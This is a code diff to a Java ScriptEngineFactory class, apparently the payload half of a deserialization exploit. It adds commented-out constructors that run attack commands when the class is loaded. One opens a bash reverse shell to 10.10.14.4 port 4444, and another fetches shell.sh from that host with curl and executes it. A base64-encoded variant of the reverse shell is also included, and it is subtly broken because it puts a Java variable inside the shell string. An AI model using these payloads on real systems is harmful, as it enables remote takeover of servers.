@@ -16,6 +16,40 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
         }
     }
 
+    // Additional payload examples (commented out by default):
+    
+    // Reverse shell payloads:
+    /*
+    public AwesomeScriptEngineFactory() {
+        String [] cmd={"bash","-c","bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"};
+        String [] jex={"bash","-c","{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"};
+        try {
+            Runtime.getRuntime().exec(cmd);
+            Runtime.getRuntime().exec(jex);
+            Runtime.getRuntime().exec("echo $jex");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+    */
+
+    // Download and execute payload with helper method:
+    /*
+    public AwesomeScriptEngineFactory() {
+        RunCmd("curl 10.10.14.4/shell.sh -o /tmp/shell.sh");
+        RunCmd("bash /tmp/shell.sh");
+    }
+
+    public String RunCmd(String Cmd) {
+        try {
+            Runtime.getRuntime().exec(Cmd);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return null;
+    }
+    */
+
     @Override
     public String getEngineName() {
         return null;
